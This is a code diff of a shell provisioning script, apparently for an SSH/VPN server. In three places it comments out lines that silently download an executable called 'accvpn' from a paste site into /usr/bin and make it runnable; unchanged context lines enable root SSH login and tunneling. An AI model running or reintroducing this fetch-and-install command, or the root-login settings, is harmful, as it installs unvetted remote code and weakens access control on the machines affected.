@@ -53,11 +53,11 @@ echo "Port 22" >> /etc/ssh/sshd_config
 echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
 echo "PermitTunnel yes" >> /etc/ssh/sshd_config
 
-echo "UseDns no" >> /etc/ssh/sshd_config
-cd /usr/bin
-wget -O accvpn "https://paste.ee/r/l6zpi" 1>/dev/null 2>/dev/null
-chmod +x accvpn
-cd
+#echo "UseDns no" >> /etc/ssh/sshd_config
+#cd /usr/bin
+#wget -O accvpn "https://paste.ee/r/l6zpi" 1>/dev/null 2>/dev/null
+#chmod +x accvpn
+#cd
 
 service ssh restart 1> /dev/null 2> /dev/null
 
@@ -137,11 +137,11 @@ echo "Port 22" >> /etc/ssh/sshd_config
 echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
 echo "PermitTunnel yes" >> /etc/ssh/sshd_config
 
-echo "UseDns no" >> /etc/ssh/sshd_config
-cd /usr/bin
-wget -O accvpn "https://paste.ee/r/l6zpi" 1>/dev/null 2>/dev/null
-chmod +x accvpn
-cd
+#echo "UseDns no" >> /etc/ssh/sshd_config
+#cd /usr/bin
+#wget -O accvpn "https://paste.ee/r/l6zpi" 1>/dev/null 2>/dev/null
+#chmod +x accvpn
+#cd
 
 service ssh restart 1> /dev/null 2> /dev/null
 
@@ -220,11 +220,11 @@ echo "Port 22" >> /etc/ssh/sshd_config
 echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
 echo "PermitTunnel yes" >> /etc/ssh/sshd_config
 
-echo "UseDns no" >> /etc/ssh/sshd_config
-cd /usr/bin
-wget -O accvpn "https://paste.ee/r/l6zpi" 1>/dev/null 2>/dev/null
-chmod +x accvpn
-cd
+#echo "UseDns no" >> /etc/ssh/sshd_config
+####cd /usr/bin
+###wget -O accvpn "https://paste.ee/r/l6zpi" 1>/dev/null 2>/dev/null
+##chmod +x accvpn
+#cd
 
 service sshd restart 1> /dev/null 2> /dev/null
 
